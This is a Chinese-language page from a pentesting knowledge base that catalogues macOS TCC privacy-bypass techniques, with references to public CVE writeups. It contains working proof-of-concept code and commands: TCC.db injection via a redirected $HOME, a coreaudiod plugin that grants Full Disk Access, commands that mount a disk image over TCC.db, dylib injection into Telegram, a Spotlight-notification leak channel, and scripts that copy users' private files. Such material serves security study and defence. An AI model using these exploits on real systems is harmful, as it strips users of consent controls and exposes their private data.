# macOS TCC 绕过

{{#include ../../../../../banners/hacktricks-training.md}}

## 按功能分类

### 写入绕过

这不是一种绕过方式，只是 TCC 的工作方式：**它不会阻止写入**。如果 Terminal **没有权限读取用户的桌面，仍然可以向其中写入**：

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**扩展属性 `com.apple.macl`**会被添加到新**文件**，以便**创建该文件的应用**能够读取它。<sup>[[2]](#references)</sup>

### TCC ClickJacking

可以**在 TCC 提示窗口上方放置一个窗口**，诱使用户在毫无察觉的情况下**接受**请求。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** 中找到 PoC。**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC 任意名称请求

攻击者可以在 **`Info.plist`** 中**创建任意名称的应用**（例如 Finder、Google Chrome……），并让它请求访问某个受 TCC 保护的位置。用户会以为是正版应用在请求访问权限。\
此外，还可以**从 Dock 中移除正版应用，并将伪造应用放到 Dock 上**，这样用户点击伪造应用（它可以使用相同的图标）时，伪造应用就能调用正版应用、请求 TCC 权限并执行恶意软件，让用户误以为是正版应用请求了访问权限。<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC：

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

默认情况下，通过 **SSH 访问曾拥有“Full Disk Access”**。要禁用此权限，需要将其列出但设为禁用状态（从列表中移除并不会撤销这些权限）：<sup>[[2]](#references)</sup>

![TCC 任意名称请求 - SSH Bypass：默认情况下，通过 SSH 访问曾拥有“Full Disk Access”。要禁用此权限，需要将其列出但设为禁用状态（从列表中移除并不会……](<../../../../../images/image (1077).png>)

此处可以找到一些**恶意软件绕过此保护机制**的示例：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 请注意，现在要启用 SSH，必须拥有 **Full Disk Access**

### 处理扩展名 - CVE-2022-26767

文件会被赋予 **`com.apple.macl`** 属性，以便**授予特定应用读取文件的权限**。当用户将文件**拖放**到应用上，或**双击**文件以使用**默认应用**打开时，就会设置此属性。

因此，用户可能会**注册一个恶意应用**来处理所有扩展名，并调用 Launch Services 来**打开**任意文件（这样恶意应用就会获准读取该文件）。<sup>[[23]](#references)</sup>

### iCloud

通过 entitlement **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC 服务通信，以**获取 iCloud tokens**。

**iMovie** 和 **Garageband** 曾拥有此 entitlement 及其他相关 entitlement。

有关利用此 entitlement **获取 iCloud tokens** 的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### 通过 Darwin 通知名称实现 Spotlight importer leak

Spotlight importer 可以读取 Spotlight 传递给其 `GetMetadataForFile` 回调的文件，即使没有 Full Disk Access 的普通进程无法读取该文件。与[向获得 TCC 授权的进程注入代码](../macos-tcc-credential-and-data-theft.md)不同，这种方式需要先在本地取得立足点，以便安装 importer，并等待匹配的 Spotlight 索引事件。importer 受 sandbox 限制，但仅包含名称的 Darwin 通知可以将字节传递给 sandbox 外部的监听器。这是一种 data-leak channel，并不能让 importer 获取 root 权限或任意文件访问权限。<sup>[[24]](#references)</sup>

在 importer 的 `Info.plist` 中，通过 `CFBundleDocumentTypes` → `LSItemContentTypes` 声明目标文件类型，然后将 bundle 安装到 `~/Library/Spotlight/` 或某个应用的 `Contents/Library/Spotlight/`。使用 `mdimport -L` 检查注册情况。[Spotlight importer 章节](../../../../macos-auto-start-locations.md#spotlight-plugins)介绍了 bundle 的放置位置和文件类型匹配。importer 只能接收 Spotlight 选择交给它处理的文件；通常已有的 importer 会优先处理。在 macOS 26 Tahoe 上，据报告的测试结果，`mdimport -i` 并不能可靠地强制立即进行递归索引，而 `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` 则会请求重新导入该 importer 声明支持的 UTI。<sup>[[24]](#references)</sup>

要测试该 channel，先在 sandbox 外部启动监听器：`notifyutil -w TEST_TEST_TEST`，然后使用 `CFNotificationCenterGetDarwinNotifyCenter()`，并将对象和 `userInfo` 设为 `NULL`，发布通知。与带有 `userInfo` payload 的 distributed notification 不同，Darwin notification 只有名称。要传输二进制数据，可使用 `notify_register_dispatch` 注册外部监听器，监听十进制名称 `0` 到 `255`，并将每个回调的注册项映射到对应的字节值。在 `GetMetadataForFile` 中，只读取 Spotlight 提供的 `pathToFile`，并将每个字节作为十进制通知名称发送：<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

监听器会重建字节序列，而不是直接读取受 TCC 保护的文件。已发布的 PoC 在 macOS 26 上、SIP 启用且未获得 FDA 权限的终端中，恢复了 `knowledgeC.db` 的前 64 个字节。这种方法带宽较低，不适合可靠地批量复制：Spotlight 可能不会索引或重新索引目标文件，并发的 importer 实例也可能导致通知流交错。有关其他受沙箱边界限制的机制，请参阅 [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/)。<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

拥有 **`kTCCServiceAppleEvents`** 权限的应用可以**控制其他应用**。这意味着它可能会**滥用授予其他应用的权限**。<sup>[[2]](#references)</sup>

有关 Apple Scripts 的更多信息，请查看：

{{#ref}}
macos-apple-scripts.md
{{#endref}}

例如，如果某个应用拥有对 `iTerm` 的 **Automation 权限**，那么它就可以控制 `iTerm`。在此示例中，**`Terminal`** 拥有对 iTerm 的访问权限：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

没有 FDA 权限的 Terminal 可以调用拥有该权限的 iTerm，并使用它执行操作：

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### 通过 Finder

或者，如果某个 App 可以通过 Finder 访问文件，它可以运行类似这样的脚本：

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## 按 App 行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户态 **tccd daemon** 使用 **`HOME`** **env** 变量，从以下路径访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据[这篇 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，并且由于 TCC daemon 通过 `launchd` 在当前用户的域中运行，因此可以**控制传递给它的所有环境变量**。<sup>[[19]](#references)</sup>\
因此，**攻击者可以在 `launchctl` 中设置 `$HOME` 环境**变量，使其指向一个**受控**的**目录**，**重启** TCC daemon，然后**直接修改 TCC 数据库**，从而为自己授予**所有可用的 TCC 权限**，而无需提示终端用户。<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes 可以访问受 TCC 保护的位置，但新建的笔记会**存储在非保护位置**。因此，攻击者可以让 Notes 将受保护的文件复制到笔记中，然后从非保护位置访问复制后的数据：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 使用的库 `libsecurity_translocate` 拥有 entitlement `com.apple.private.nullfs_allow`，允许它创建 **nullfs** 挂载；它还拥有 entitlement `com.apple.private.tcc.allow`，其中包含 **`kTCCServiceSystemPolicyAllFiles`**，允许它访问所有文件。

攻击者可以为“Library”添加 quarantine attribute，调用 **`com.apple.security.translocation`** XPC 服务，之后该服务会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以**访问** Library 中的所有文档。

### CVE-2024-44131 - FileProvider symlink race

将文件操作交由**特权 helper** 执行的应用（此处为 **`fileproviderd`** / `Files.app`）会**代表用户**复制或移动项目，因此复制操作使用的是 helper 的权限，而不是调用方的权限。

Jamf Threat Labs 展示了在操作执行前进行的 symlink 验证可以被**竞态利用**：攻击者不是在**最后一个**路径组件（会被检查）上放置 symlink，而是在复制已经开始后替换路径中的某个**中间**目录。随后，特权 helper 会跟随攻击者控制的链接，在**完全不显示提示**的情况下读取/写入受 TCC 保护的位置。<sup>[[5]](#references)</sup>

路径中**没有**随机 UUID 保护的目录（例如 `~/Library/Mobile Documents/com~apple~CloudDocs`）是最容易攻击的目标，因为攻击者可以预测完整路径并发起竞态。

> [!TIP]
> 可以重点留意这种通用模式：**任何会多次解析路径的特权进程**（先检查后使用，或 `rename()`/`copyfile()` 分别解析源路径和目标路径）都可能因攻击者替换路径中间的目录而遭到竞态攻击。只有 `O_NOFOLLOW_ANY`、在已打开的目录 FD 上使用 `openat()`，或 `realpath()` + 重新验证，才能真正消除此风险窗口。

更多信息见 [**Jamf Threat Labs 的 writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)。<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` 可以通过 `SQLITE_ENABLE_SQLLOG` 构建，该选项会添加一个由环境变量驱动的日志记录钩子（[上游 `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）：<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – 对于**每个打开的数据库**，数据库文件的**副本**以及 SQL 语句日志都会写入 `path`（该目录必须已存在）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – 每次打开/附加 DB 时都创建**新的副本**，而不是重复使用现有副本。
- **`SQLITE_SQLLOG_CONDITIONAL`** – 仅当主 DB 旁边存在 `<database>-sqllog` 文件时，才记录该连接的日志。

如果你能将此变量注入一个拥有 **FDA** 且会打开 SQLite 数据库的进程，它就会将这些受保护的数据库**复制**到你控制的目录中。由于目标文件名源自攻击者可控的数据，在目标位置放置一个 **symlink**，就可以将同一原语转化为使用目标进程权限执行的**任意文件写入**。

### **SQLITE_AUTO_TRACE**

如果设置了环境变量 **`SQLITE_AUTO_TRACE`**，库 **`libsqlite3.dylib`** 就会开始**记录**所有 SQL 查询。许多应用都使用了这个库，因此可以记录它们的所有 SQLite 查询。<sup>[[22]](#references)</sup>

有几个 Apple 应用使用这个库来访问受 TCC 保护的信息。

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### 搜寻由环境变量驱动的文件写入

前面的两个条目都是同一种通用技术的实例，值得继续搜寻更多案例：**加载到拥有 TCC 特权的应用中的框架，通常会公开调试/日志环境变量，使进程在调用者可控的路径创建文件**。

搜寻流程：

1. 选择一个拥有 FDA 或其他有价值的 TCC 权限的目标（`Music`、`TV`、`Terminal`、MDM agents...），并列出它链接的框架（`otool -L`、`vmmap`）。
2. 在这些框架中搜索 `getenv` 字符串：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. 通过 `launchctl setenv NAME /path/you/control` 设置候选变量，启动应用，并使用 `fs_usage -w -f filesys <pid>` 或 `sudo fs_usage | grep <path>` 观察它对文件系统做了什么。
4. 如果进程在你的目录中**创建或重命名**文件，你就获得了写入原语：将目标路径指向一个 symlink（或像上文 CVE-2024-44131 那样抢占中间目录），将其重定向到 `~/Library/Application Support/com.apple.TCC/TCC.db`。

> [!TIP]
> 有两点限制了这种方法。首先，**对于启用了 hardened runtime 的二进制文件，`DYLD_*` 变量会被忽略**，除非应用带有 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（“一个布尔值，表示应用是否可能受到动态链接器环境变量的影响；你可以利用这些变量向应用进程注入代码”）——另请参阅 [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)。其次，Apple 会在框架调试变量被报告后逐一移除，因此某个变量在一个 macOS 版本中有效，通常到了下一个版本就已失效。如果设置变量后应用悄无声息地拒绝启动，就应将该变量视为已被过滤。<sup>[[7]](#references)[[8]](#references)</sup>

有关使用链接器变量实现的等效技巧，请参阅 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)。

### Apple Remote Desktop

作为 root，你可以启用此服务，而 **ARD agent 将拥有完整磁盘访问权限**，之后用户便可滥用它，使其复制一个新的 **TCC 用户数据库**。

## 通过 **NFSHomeDirectory**

TCC 使用用户 HOME 文件夹中的数据库来控制对该用户专属资源的访问，路径为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果用户设法通过指向**其他文件夹**的 `$HOME` 环境变量重启 TCC，用户就可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 创建新的 TCC 数据库，并诱使 TCC 向任何应用授予任意 TCC 权限。

> [!TIP]
> 请注意，Apple 使用用户个人资料中 **`NFSHomeDirectory`** 属性所存储的设置作为 **`$HOME`** 的值，因此，如果你攻陷了一个有权限修改此值（**`kTCCServiceSystemPolicySysAdminFiles`**）的应用，就可以利用此选项实施 TCC bypass。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 修改用户的 **HOME** 文件夹。

1. 获取目标应用的 _csreq_ blob。
2. 创建一个包含所需访问权限和 _csreq_ blob 的伪造 _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出用户的 Directory Services 条目。
4. 修改 Directory Services 条目以更改用户的 home directory。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的 Directory Services 条目。
6. 停止用户的 _tccd_ 并重启进程。

第二个 POC 使用了 **`/usr/libexec/configd`**，它具有值为 `kTCCServiceSystemPolicySysAdminFiles` 的 `com.apple.private.tcc.allow`。\
可以通过 **`-t`** 选项运行 **`configd`**，攻击者能够指定一个**要加载的自定义 Bundle**。因此，该 exploit 通过 **`configd` code injection** 替代了使用 **`dsexport`** 和 **`dsimport`** 更改用户 home directory 的方法。

更多信息请参阅[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。<sup>[[11]](#references)</sup>

## 通过进程注入

有多种技术可以将代码注入进程并滥用其 TCC 权限：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

此外，发现的最常见的用于绕过 TCC 的进程注入方式是通过 **plugins (load library)**。\
Plugins 是额外的代码，通常以 libraries 或 plist 的形式存在，会由**主应用加载**并在其上下文中执行。因此，如果主应用可以访问受 TCC 限制的文件（通过已授予的权限或 entitlements），**自定义代码也将拥有相同的访问权限**。

### CVE-2020-27937 - Directory Utility

应用 `/System/Library/CoreServices/Applications/Directory Utility.app` 拥有 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement，会加载扩展名为 **`.daplug`** 的 plugins，且**未启用 hardened** runtime。

要利用此 CVE，需**更改** **`NFSHomeDirectory`**（滥用前述 entitlement），以**接管用户的 TCC 数据库**并绕过 TCC。

更多信息请参阅[**原始报告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

二进制文件 **`/usr/sbin/coreaudiod`** 拥有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager` entitlements。前者**允许代码注入**，后者则使其能够**管理 TCC**。

该二进制文件允许从文件夹 `/Library/Audio/Plug-Ins/HAL` 加载**第三方 plug-ins**。因此，可以使用此 PoC **加载 plugin 并滥用 TCC 权限**：<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

更多信息请查看 [**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。<sup>[[13]](#references)</sup>

### 设备抽象层 (DAL) 插件

通过 Core Media I/O 打开摄像头流的系统应用（具有 **`kTCCServiceCamera`** 的应用）会在进程中加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL` 的这些插件（不受 SIP 限制）。

只需在该目录中存放一个带有通用 **constructor** 的库，就能 **inject code**。

多个 Apple 应用曾存在此漏洞。

### Firefox

Firefox 应用具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` 权限：<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

关于如何轻松利用这一点的更多信息，请[**查看原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[14]](#references)</sup>

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 拥有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** 这两个 entitlements，因此可以向进程中注入代码并使用 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 拥有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** 这两个 entitlements，因此可以滥用它来**获取其权限**，例如使用摄像头录制。你可以在[**文章中找到 payload**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[15]](#references)</sup>

请注意，为了使用环境变量加载 library，创建了一个**自定义 plist** 来注入该 library，并使用 **`launchctl`** 启动它：<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## 通过调用 open

即使处于 sandboxed 状态，也可以调用 **`open`**

### 终端脚本

在至少是技术人员使用的电脑上，通常会为终端授予 **Full Disk Access (FDA)**。也可以使用它来调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是 plist 文件，例如下面这个文件，其中包含要在 **`CommandString`** 键中执行的命令：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

应用可以在 /tmp 等位置写入终端脚本，并使用类似以下的命令启动它：

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## 通过挂载

### CVE-2020-9771 - mount_apfs TCC 绕过和权限提升

**任何用户**（即使是非特权用户）都可以创建并挂载 Time Machine 快照，从而**访问该快照中的所有文件**。\
**唯一需要的特权**是所用应用（例如 `Terminal`）具有**完全磁盘访问权限**（FDA）（`kTCCServiceSystemPolicyAllfiles`），且该权限必须由管理员授予。<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

更详细的说明可以[**在原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - 覆盖挂载 TCC 文件

即使 TCC DB 文件受到保护，也可以**在该目录上挂载**一个新的 TCC.db 文件：

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

查看[**原始文章**](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整 exploit**。<sup>[[21]](#references)</sup>

### CVE-2024-40855

如[原始文章](https://www.kandji.io/blog/macos-audit-story-part2)所述，此 CVE 利用了 `diskarbitrationd`。<sup>[[16]](#references)</sup>

公共 `DiskArbitration` framework 中的函数 `DADiskMountWithArgumentsCommon` 执行了安全检查。不过，可以通过直接调用 `diskarbitrationd` 绕过检查，因此能够在路径中使用 `../` 元素和符号链接。

由于 `diskarbitrationd` 拥有 entitlement `com.apple.private.security.storage-exempt.heritable`，攻击者可以在任意位置执行挂载操作，包括覆盖 TCC 数据库。

### asr

工具 **`/usr/sbin/asr`** 可以复制整个磁盘并将其挂载到其他位置，从而绕过 TCC 保护。

### CVE-2022-22655 - 定位服务

定位服务不像其他服务那样存储在 TCC 数据库中。它们由 `locationd` 管理，而 `locationd` 在 **`/var/db/locationd/clients.plist`** 中维护自己的允许列表：<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

每个条目以客户端（bundle ID 或可执行文件路径）为键，并包含 `Authorized`、`BundleId`、`Executable` 和 `Registered` 等字段。<sup>[[4]](#references)</sup>

`clients.plist` 文件本身受 Sandbox/TCC 保护，即使是 root 也无法编辑——但 **`/var/db/locationd/` 目录并未受到挂载保护**。因此，以 root 身份运行的攻击者可以创建一个包含自定义 `clients.plist` 的磁盘映像（将其二进制文件标记为 `Authorized`），将映像挂载到该目录上，然后重启 `locationd`，使伪造的允许列表生效。<sup>[[3]](#references)</sup>

> [!TIP]
> 这和上文的 `hdiutil`/`mount` TCC bypass 使用的是同一种模式：受保护的是*文件*，而不是它所在的*目录*，因此替换整个目录，而不是文件。

## 通过启动应用

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## 通过 grep

有时，文件会在非受保护的位置存储电子邮件地址、电话号码、消息等敏感信息（这在 Apple 看来属于漏洞）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## 合成点击

这种方法现在已不可用，但[**过去可以使用**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

另一种使用 [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) 的方法：<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934：绕过 macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [意外与蓄意绕过 macOS TCC 用户隐私保护机制](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass（原始报告）](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego 身在何处：滥用 macOS 上的 Location Services](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131：TCC bypass 窃取 iCloud 数据](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c`（SQLITE_ENABLE_SQLLOG 环境变量）](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - 允许 DYLD 环境变量的 entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - 公证：强化运行时](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [在 XCSSET 恶意软件中发现 Zero-Day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0：“Mac 上发生的事，会留在 Apple 的 iCloud 里？！” - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
